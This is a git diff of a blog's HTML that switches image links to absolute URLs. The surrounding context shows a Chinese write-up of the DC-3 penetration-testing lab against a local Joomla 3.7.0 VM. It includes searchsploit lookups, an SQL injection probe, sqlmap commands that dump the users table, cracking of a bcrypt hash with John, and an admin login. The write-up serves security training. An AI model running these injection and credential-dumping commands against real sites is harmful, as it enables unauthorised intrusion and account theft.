-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016_hu_45c54a337cf57fc.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016_hu_651786c0aa3c5ea3.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016_hu_45c54a337cf57fc.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016_hu_651786c0aa3c5ea3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -383,10 +383,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图8 获取网站后台管理地址&lt;/p&gt;
 &lt;p&gt;得到joomla版本信息， 版本为3.7.0 也得到了网站后台地址&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/administrator/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;http://192.168.248.136/administrator/&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018.png&#34;
+    &gt;http://192.168.248.136/administrator/&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018.png&#34;
 	width=&#34;536&#34;
 	height=&#34;290&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018_hu_20aca170a8ff31f0.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018_hu_d1b09711f7ceaeb1.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018_hu_20aca170a8ff31f0.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image018_hu_d1b09711f7ceaeb1.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -400,10 +400,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等&lt;/p&gt;
 &lt;p&gt;输入nikto &amp;ndash;url &lt;a class=&#34;link&#34; href=&#34;http://192.168.186.131/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://192.168.186.131/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020.png&#34;
 	width=&#34;535&#34;
 	height=&#34;133&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020_hu_511ea8b051727c.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020_hu_303ebfe6037e7606.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020_hu_511ea8b051727c.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image020_hu_303ebfe6037e7606.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -416,10 +416,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(8)输入searchsploit joomla 3.7.0&lt;/p&gt;
 &lt;p&gt;前面已经知道了joomla的版本是3.7.0&lt;/p&gt;
 &lt;p&gt;利用searchsploit命令扫描漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021.png&#34;
 	width=&#34;556&#34;
 	height=&#34;156&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021_hu_617cabad3b12ac83.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021_hu_2f870f73ed374a28.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021_hu_617cabad3b12ac83.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image021_hu_2f870f73ed374a28.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -431,10 +431,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图11 searchsploit扫描结果&lt;/p&gt;
 &lt;p&gt;发现存在一个sql注入漏洞，和xss漏洞&lt;/p&gt;
 &lt;p&gt;(9)输入 searchsploit -m 42033.txt查看漏洞提示信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022.png&#34;
 	width=&#34;540&#34;
 	height=&#34;177&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022_hu_ba65db60fffeed7d.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022_hu_6508eadc35e564ad.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022_hu_ba65db60fffeed7d.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image022_hu_6508eadc35e564ad.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -445,10 +445,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图12 sql注入漏洞提示信息&lt;/p&gt;
 &lt;p&gt;(10)输入cat 42033.txt查看漏洞文件详细信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024.png&#34;
 	width=&#34;468&#34;
 	height=&#34;173&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024_hu_95de9647c9a47dc0.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024_hu_a35e9cca4a0eb4bc.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024_hu_95de9647c9a47dc0.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image024_hu_a35e9cca4a0eb4bc.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -462,10 +462,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml%22&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml%22&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;看到提示： 您的SQL语法有错误;说明进行了拼接，存在SQL注入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026.png&#34;
 	width=&#34;537&#34;
 	height=&#34;275&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026_hu_6b2ead63c3b87f8.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026_hu_3cdfea5413f4920a.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026_hu_6b2ead63c3b87f8.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image026_hu_3cdfea5413f4920a.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -479,10 +479,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;输入sqlmap -u&lt;/p&gt;
 &lt;p&gt;“http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml”&amp;ndash;risk=3 &amp;ndash;level=5 &amp;ndash;random-agent &amp;ndash;dbs -p list[fullordering] –batch&lt;/p&gt;
 &lt;p&gt;跑出的数据库如图所示&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028.png&#34;
 	width=&#34;536&#34;
 	height=&#34;211&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028_hu_565209707e476981.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028_hu_e1644c2f5b6da9d5.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028_hu_565209707e476981.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image028_hu_e1644c2f5b6da9d5.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -494,10 +494,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图15sqlmap 跑出的所有数据库&lt;/p&gt;
 &lt;p&gt;(13)输入 sqlmap -u&lt;/p&gt;
 &lt;p&gt;&amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml”&amp;ndash;risk=3 &amp;ndash;level=5 &amp;ndash;random-agent &amp;ndash;dbs -p list[fullordering]  &amp;ndash;current-db –batch获取当前数据库&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030.png&#34;
 	width=&#34;536&#34;
 	height=&#34;173&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030_hu_9b8a7cb56458f145.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030_hu_196859292c6a2838.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030_hu_9b8a7cb56458f145.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image030_hu_196859292c6a2838.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -510,10 +510,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(14)输入 sqlmap -u&lt;/p&gt;
 &lt;p&gt;&amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables &amp;ndash;batch&lt;/p&gt;
 &lt;p&gt;获取到当前数据库中的表&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032.png&#34;
 	width=&#34;457&#34;
 	height=&#34;121&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032_hu_3eef13a19758bb91.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032_hu_e89bd4610f4a67d.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032_hu_3eef13a19758bb91.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image032_hu_e89bd4610f4a67d.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -526,10 +526,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(15)输入sqlmap -u&lt;/p&gt;
 &lt;p&gt;&amp;ldquo;http://192.168.186.131/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables -T &amp;ldquo;#__users&amp;rdquo; &amp;ndash;columns&lt;/p&gt;
 &lt;p&gt;第一个选项选y&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034.png&#34;
 	width=&#34;535&#34;
 	height=&#34;158&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034_hu_c96e62f16a5be895.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034_hu_f0dd23d35bfb2da1.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034_hu_c96e62f16a5be895.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image034_hu_f0dd23d35bfb2da1.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -542,10 +542,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;第二个选项也是y&lt;/p&gt;
 &lt;p&gt;第三个默认&lt;/p&gt;
 &lt;p&gt;第四个选10&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036.png&#34;
 	width=&#34;537&#34;
 	height=&#34;141&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036_hu_6034e9104f2c58d9.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036_hu_5c9590273711f6a2.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036_hu_6034e9104f2c58d9.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image036_hu_5c9590273711f6a2.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -555,10 +555,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt; &lt;/p&gt;
 &lt;p&gt;图19  sqlmap 获取users表信息2&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038.png&#34;
 	width=&#34;536&#34;
 	height=&#34;225&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038_hu_ac1de9906706a901.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038_hu_cd30ea7220aef583.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038_hu_ac1de9906706a901.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image038_hu_cd30ea7220aef583.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -569,10 +569,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图20   sqlmap 获取到的users表中的关键列&lt;/p&gt;
 &lt;p&gt;(16)输入sqlmap -u &amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables -T &amp;ldquo;#__users&amp;rdquo; &amp;ndash;columns -C &amp;ldquo;username,password&amp;rdquo; &amp;ndash;dump &amp;ndash;batch&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040.png&#34;
 	width=&#34;537&#34;
 	height=&#34;164&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040_hu_f397dc36723b0717.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040_hu_27abc89dd827144c.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040_hu_f397dc36723b0717.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image040_hu_27abc89dd827144c.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -586,10 +586,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;先创建一个1.txt，把加密的密码字段写入echo ‘$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu’ &amp;gt; 1.txt  &lt;/p&gt;
 &lt;p&gt;再输入cat 1.txt 打开1.txt文件&lt;/p&gt;
 &lt;p&gt;在输入jhon 1.txt破解密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042.png&#34;
 	width=&#34;536&#34;
 	height=&#34;248&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042_hu_db1d4b53b310d6ed.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042_hu_38173f19e55376a6.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042_hu_db1d4b53b310d6ed.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image042_hu_38173f19e55376a6.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -602,10 +602,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(18)在 &lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/administrator/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://192.168.248.136/administrator/&lt;/a&gt;网站   &lt;/p&gt;
 &lt;p&gt;登录  用户名是admin 密码是snoopy&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044.png&#34;
